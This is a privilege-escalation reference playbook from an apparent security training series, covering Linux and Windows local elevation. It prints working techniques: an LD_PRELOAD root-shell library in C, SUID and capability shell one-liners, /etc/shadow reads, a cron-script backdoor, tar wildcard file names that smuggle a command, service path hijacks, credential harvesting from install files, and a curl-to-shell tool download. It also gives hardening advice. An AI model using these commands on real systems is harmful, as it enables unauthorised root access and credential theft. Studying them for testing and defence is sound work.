<!--
Title: Windows & Linux Privilege Escalation Master Playbook
Volume: Volume 12 — Career Checklists and Reference Material
Category: Master Playbook
Prerequisites:
  - ../Volume_01_Computer_and_Programming_Foundations/Windows_and_Linux_OS_Foundations_and_Command_Mastery.md
  - ../Volume_02_Linux_Networking_and_Security_Foundations/Module_05_Linux_Architecture_and_Administration.md
  - ../Volume_07_Network_Penetration_Testing/Module_32_Network_Penetration_Testing_Execution.md
Last Updated: 2026-09-06
-->

# Windows & Linux Privilege Escalation — Master Playbook

> **Volume 12 · Career Checklists & Reference Material**  
> Complete technical reference for local enumeration, privilege boundary evaluation, misconfiguration auditing, and local root/SYSTEM elevation across Linux and Microsoft Windows operating systems.

---

## Table of Contents

1. [Privilege Escalation Foundations & Threat Models](#1-privilege-escalation-foundations--threat-models)
2. [Linux Privilege Escalation Methodology](#2-linux-privilege-escalation-methodology)
   - [2.1 Initial Host Enumeration & Posture Assessment](#21-initial-host-enumeration--posture-assessment)
   - [2.2 Sudo Privilege Flaws & Environment Variable Abuse](#22-sudo-privilege-flaws--environment-variable-abuse)
   - [2.3 SUID/SGID Binaries & GTFOBins Exploitation](#23-suidsgid-binaries--gtfobins-exploitation)
   - [2.4 Linux Capabilities (cap_setuid, cap_dac_read_search)](#24-linux-capabilities-cap_setuid-cap_dac_read_search)
   - [2.5 Scheduled Tasks, Cron Jobs & Path Traversal](#25-scheduled-tasks-cron-jobs--path-traversal)
   - [2.6 Shared Object / Library Hijacking (LD_PRELOAD, RPATH)](#26-shared-object--library-hijacking-ld_preload-rpath)
   - [2.7 Kernel Vulnerability Validation (Dirty COW, Dirty Pipe)](#27-kernel-vulnerability-validation-dirty-cow-dirty-pipe)
3. [Windows Privilege Escalation Methodology](#3-windows-privilege-escalation-methodology)
   - [3.1 Initial Environment Discovery & Token Inspection](#31-initial-environment-discovery--token-inspection)
   - [3.2 Token Privileges (SeImpersonate, SeBackup, SeDebug)](#32-token-privileges-seimpersonate-sebackup-sedebug)
   - [3.3 Service Misconfigurations (Unquoted Paths, Insecure Permissions)](#33-service-misconfigurations-unquoted-paths-insecure-permissions)
   - [3.4 Registry Flaws (AlwaysInstallElevated, Autorun, Modifiable Keys)](#34-registry-flaws-alwaysinstallelevated-autorun-modifiable-keys)
   - [3.5 Password Harvesting & Unattended Install Files](#35-password-harvesting--unattended-install-files)
   - [3.6 DLL Hijacking & Path Precedence Abuse](#36-dll-hijacking--path-precedence-abuse)
4. [Automated Diagnostic Tools & Triage Scripts](#4-automated-diagnostic-tools--triage-scripts)
5. [Hardening Directives & Defensive Architecture](#5-hardening-directives--defensive-architecture)
6. [Authoritative References](#6-authoritative-references)

---

## 1. Privilege Escalation Foundations & Threat Models

Privilege escalation occurs when a security principal (a user or process) circumvents access control boundaries to acquire permissions, capabilities, or rights granted exclusively to a higher-tier entity (e.g., standard user to `root` on POSIX systems or `NT AUTHORITY\SYSTEM` on Windows).

```
[Low-Priv User / Service Account]
         |
         +--> Horizontal Escalation (Accessing sibling user resources/data)
         |
         +--> Vertical Escalation (Escalating to root / SYSTEM / Domain Admin)
                  |
                  +--- Operating System Kernel Flaws
                  +--- Service Misconfigurations & Insecure DACLs
                  +--- Excessive Tokens / Capabilities
                  +--- Insecure File/Directory Permissions
```

---

## 2. Linux Privilege Escalation Methodology

### 2.1 Initial Host Enumeration & Posture Assessment

Perform deterministic, low-noise local enumeration using standard core utilities:

```bash
# User context, groups, and active privileges
id && whoami && groups

# Kernel release, distribution architecture, and hardware info
uname -a && cat /etc/*release

# Active processes with command-line arguments
ps aux | grep -v '\[.*\]'

# Listening TCP/UDP network sockets (internal services bound to 127.0.0.1)
ss -tulpn || netstat -antup

# Mount points and filesystem permissions (identify noexec, nosuid)
cat /proc/mounts | grep -E 'ext4|xfs|btrfs|nfs'
```

---

### 2.2 Sudo Privilege Flaws & Environment Variable Abuse

#### Sudo Configuration Audit
```bash
sudo -l
```

#### 1. LD_PRELOAD Environment Preservation
If `sudo -l` reveals `env_keep += LD_PRELOAD` alongside any permitted command:
```c
/* /tmp/preload.c */
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```
Compile and execute:
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/allowed_command
```

#### 2. Sudoedit Path Traversal (CVE-2021-3156 / Baron Samedit)
Vulnerable versions of Sudo (< 1.9.5p2) allow buffer overflow and heap corruption when invoked as `sudoedit -s '\'` with command-line arguments ending in unescaped backslashes.

---

### 2.3 SUID/SGID Binaries & GTFOBins Exploitation

SUID (`Set User ID upon execution`) binaries execute with the permissions of the file owner rather than the calling user.

```bash
# Locate all SUID binaries across the root filesystem
find / -perm -u=s -type f 2>/dev/null
```

#### Common SUID Binary Abuse Vectors (GTFOBins)

| Binary | Abuse Technique | Verification One-Liner |
|---|---|---|
| `/usr/bin/find` | `-exec` parameter execution | `find . -exec /bin/sh -p \; -quit` |
| `/usr/bin/vim` | SUID shell spawn | `vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'` |
| `/usr/bin/nano` | Shell escaping via file prompt | `nano` -> `^R ^X` -> `reset; sh 1>&0 2>&0` |
| `/usr/bin/base64` | Arbitrary file read | `base64 /etc/shadow | base64 -d` |
| `/usr/bin/cp` | Overwrite `/etc/passwd` | Generate root hash via `openssl passwd -1 -salt root pass` and overwrite |
| `/usr/bin/env` | Direct shell invocation | `env /bin/sh -p` |

---

### 2.4 Linux Capabilities (cap_setuid, cap_dac_read_search)

Linux capabilities segment traditional root privileges into granular units assigned directly to executables via extended filesystem attributes:

```bash
# Enumerate all binaries possessing extended capabilities
getcap -r / 2>/dev/null
```

#### Exploitation Scenarios
* **`cap_setuid+ep` on Python/Perl/Ruby**:
  ```bash
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  ```
* **`cap_dac_read_search+ep` on Tar/Custom binaries**:
  Allows bypassing file read permissions, granting access to `/etc/shadow` or private SSH keys.

---

### 2.5 Scheduled Tasks, Cron Jobs & Path Traversal

```bash
# View user and system-wide crontabs
crontab -l
cat /etc/crontab /etc/cron.*/* 2>/dev/null
```

#### 1. Writable Cron Script Overwrite
If a root cron job runs `/usr/local/bin/backup.sh` and the file is group- or world-writable:
```bash
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /usr/local/bin/backup.sh
# Await cron interval, then invoke:
/tmp/rootbash -p
```

#### 2. Tar Wildcard Injection in Cron
If a root cron entry runs `tar -czf /backup/backup.tar.gz *` inside a user-writable directory:
```bash
# Create checkpoint argument files inside target folder
touch "/var/www/html/--checkpoint=1"
touch "/var/www/html/--checkpoint-action=exec=sh payload.sh"
echo "chmod +s /bin/bash" > /var/www/html/payload.sh
```

---

### 2.6 Shared Object / Library Hijacking (LD_PRELOAD, RPATH)

Inspect binary dynamic links and search paths:
```bash
ldd /usr/local/bin/custom_app
objdump -x /usr/local/bin/custom_app | grep -E 'RPATH|RUNPATH'
```
If `RPATH` contains a writable directory (e.g., `.`), placing a malicious compiled `.so` with the required soname triggers execution when the SUID binary loads.

---

### 2.7 Kernel Vulnerability Validation (Dirty COW, Dirty Pipe)

* **Dirty COW (CVE-2016-5195)**: Race condition in Copy-On-Write logic allowing write access to read-only memory mappings (e.g., `/etc/passwd`).
* **Dirty Pipe (CVE-2022-0847)**: Uninitialized pipe buffer flags allowing arbitrary overwrite of read-only cached page files (Linux 5.8 < 5.16.11).

```bash
# Check kernel version compatibility
uname -r
```

---

## 3. Windows Privilege Escalation Methodology

### 3.1 Initial Environment Discovery & Token Inspection

```cmd
:: Account and group context
whoami /all

:: Operating system build and hotfix status
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

:: Active network connections and local listening ports
netstat -ano | findstr LISTENING

:: Stored Windows credentials
cmdkey /list
```

---

### 3.2 Token Privileges (SeImpersonate, SeBackup, SeDebug)

Inspect `whoami /priv` for high-impact privileges:

| Privilege | Common Assigned Context | Exploitation Impact | Tooling / Vector |
|---|---|---|---|
| **`SeImpersonatePrivilege`** | `LOCAL SERVICE`, `NETWORK SERVICE`, IIS AppPool | Impersonate client token to escalate directly to `SYSTEM` | PrintSpoofer, GodPotato, SweetPotato |
| **`SeBackupPrivilege`** | Backup Operators | Read any file ignoring ACLs (extract SAM, SYSTEM, NTDS.dit) | `reg save`, Diskshadow |
| **`SeDebugPrivilege`** | Local Administrators | Attach to and inject memory into any process (dump LSASS) | ProcDump, Task Manager, MiniDump |
| **`SeLoadDriverPrivilege`** | System Operators | Load arbitrary kernel-mode drivers | BYOVD (Bring Your Own Vulnerable Driver) |

#### SeImpersonate Exploitation with PrintSpoofer
PrintSpoofer leverages the Named Pipe File System and RPC print spooler notifications (`RpcOpenPrinter`) to force a SYSTEM token authentication across an initialized named pipe:

```cmd
PrintSpoofer.exe -i -c cmd.exe
```

---

### 3.3 Service Misconfigurations (Unquoted Paths, Insecure Permissions)

#### 1. Unquoted Service Paths (CWE-428)
When a Windows service binary path containing spaces is unquoted (e.g., `C:\Program Files\Vuln Service\app.exe`), Windows resolves executables in order of precedence:
1. `C:\Program.exe`
2. `C:\Program Files\Vuln.exe`
3. `C:\Program Files\Vuln Service\app.exe`

```cmd
:: Query all services with unquoted paths and non-system directories
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\" | findstr /i /v """"
```

#### 2. Insecure Service DACLs (Modifiable Config)
Inspect service permissions using `accesschk.exe` or `sc.exe`:
```cmd
accesschk.exe -ucqv "standarduser" * -c
```
If `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS` is granted:
```cmd
sc config TargetService binpath= "C:\Temp\payload.exe"
sc stop TargetService
sc start TargetService
```

---

### 3.4 Registry Flaws (AlwaysInstallElevated, Autorun)

#### AlwaysInstallElevated Policy
If both registry keys are set to `1` (DWORD):
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Standard users can craft an MSI package via `msfvenom` that installs and executes code with elevated `NT AUTHORITY\SYSTEM` privileges:
```cmd
msiexec /quiet /qn /i C:\Temp\elevate.msi
```

---

### 3.5 Password Harvesting & Unattended Install Files

Search for cleartext credentials in deployment artifacts:
```cmd
:: Unattended setup files
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\System32\Sysprep\sysprep.xml 2>nul

:: Search registry for stored passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

---

## 4. Automated Diagnostic Tools & Triage Scripts

| Platform | Diagnostic Utility | Primary Execution Command |
|---|---|---|
| **Linux** | **LinPEAS** | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **Linux** | **Linux Exploit Suggester** | `perl les.pl -k $(uname -r)` |
| **Windows** | **WinPEAS** | `winPEASany.exe quiet cmd fast` |
| **Windows** | **PrivescCheck** | `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"` |
| **Windows** | **PowerUp** | `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"` |

---

## 5. Hardening Directives & Defensive Architecture

### Linux System Hardening
1. **Remove Unnecessary SUID/SGID Flags**:
   * Regularly audit `find / -perm -u=s` and strip SUID bits from command-line utilities using `chmod u-s /path/to/binary`.
2. **Restrict Sudo Permissions**:
   * Never grant wildcard `ALL` in `/etc/sudoers`.
   * Enforce `NOEXEC` where feasible.
   * Disable `env_keep += LD_PRELOAD`.
3. **Mount Hardening**:
   * Mount `/tmp`, `/dev/shm`, and `/var/tmp` with `noexec,nosuid,nodev`.

### Windows System Hardening
1. **Disable Unnecessary Privileges**:
   * Restrict service account privileges; run web pools under virtual service accounts without `SeImpersonatePrivilege`.
2. **Quote All Service Binaries**:
   * Verify all registry keys under `HKLM\SYSTEM\CurrentControlSet\Services` enclose `ImagePath` strings in double quotes.
3. **Enforce Least Privilege File/Registry DACLs**:
   * Ensure non-administrative users do not possess `Write`, `Modify`, or `FullControl` on `Program Files` subdirectories or service keys.

---

## 6. Authoritative References

* **GTFOBins**: Curated list of Unix binaries that can be used to bypass local security restrictions
* **LOLBAS**: Living Off The Land Binaries, Scripts and Libraries (Windows)
* **CIS Benchmarks**: CIS Distribution Independent Linux Benchmark & CIS Microsoft Windows Server Benchmark
* **MITRE ATT&CK Framework**:
  * T1068: Exploitation for Privilege Escalation
  * T1548: Abuse Elevation Control Mechanism (.001 SUID/SGID, .002 Bypass UAC, .003 Sudo)
  * T1134: Access Token Manipulation (.001 Token Impersonation/Theft)
